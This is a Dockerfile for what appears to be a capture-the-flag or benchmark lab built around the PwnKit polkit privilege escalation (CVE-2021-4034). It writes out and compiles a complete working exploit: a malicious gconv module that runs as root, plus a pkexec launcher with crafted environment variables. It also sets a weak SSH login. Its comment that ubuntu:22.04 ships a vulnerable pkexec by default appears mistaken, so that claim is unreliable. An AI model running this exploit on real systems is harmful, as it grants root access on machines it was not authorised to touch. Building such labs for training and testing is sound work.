FROM ubuntu:22.04

# Install SSH and vulnerable polkit (CVE-2021-4034) with build tools for PoC compilation
# pkexec 0.105 on ubuntu:22.04 is vulnerable to CVE-2021-4034 by default
RUN set -ex; \
    apt-get update && apt-get install -y --no-install-recommends \
        openssh-server policykit-1 build-essential && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Create low-privilege user for SSH login
RUN useradd -m -s /bin/bash attacker && \
    echo 'attacker:password123' | chpasswd && \
    mkdir -p /var/run/sshd

# Pre-build the gconv infrastructure for CVE-2021-4034 exploitation
# Create the gconv module and config in /tmp
RUN set -ex; \
    mkdir -p /tmp/GCONV_PATH=.; \
    touch /tmp/GCONV_PATH=./pwnkit; \
    chmod +x /tmp/GCONV_PATH=./pwnkit; \
    printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(){\n    setuid(0);setgid(0);\n    system("cat /root/flag.txt > /tmp/.flag_out");\n    exit(0);\n}\n' > /tmp/pwnkit.c; \
    gcc -shared -fPIC /tmp/pwnkit.c -o /tmp/pwnkit.so; \
    echo 'module UTF-8// PWNKIT// pwnkit 1' > /tmp/gconv-modules; \
    chown -R attacker:attacker /tmp/pwnkit.c /tmp/pwnkit.so /tmp/gconv-modules; \
    chmod 755 /tmp/pwnkit.so /tmp/GCONV_PATH=./pwnkit 2>/dev/null || true

# Pre-compile a launcher that calls pkexec with crafted env for the exploit
# envp[0] gets read by pkexec as argv[1] due to OOB read when argc=0
RUN set -ex; \
    printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(){\n    char *envp[]={"PATH=GCONV_PATH=.","CHARSET=PWNKIT","SHELL=pwnkit",NULL};\n    char *a[]={NULL};\n    execve("/usr/bin/pkexec",a,envp);\n    return 0;\n}\n' > /tmp/run_pwnkit.c; \
    gcc /tmp/run_pwnkit.c -o /tmp/run_pwnkit; \
    chown attacker:attacker /tmp/run_pwnkit /tmp/run_pwnkit.c; \
    chmod 755 /tmp/run_pwnkit

# Flag at /root/flag.txt (requires root to read)
ARG CVE_FLAG=flag{lnx-11-default}
RUN echo "${CVE_FLAG}" > /root/flag.txt && chmod 600 /root/flag.txt

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D", "-o", "PermitRootLogin=no", "-o", "PasswordAuthentication=yes"]
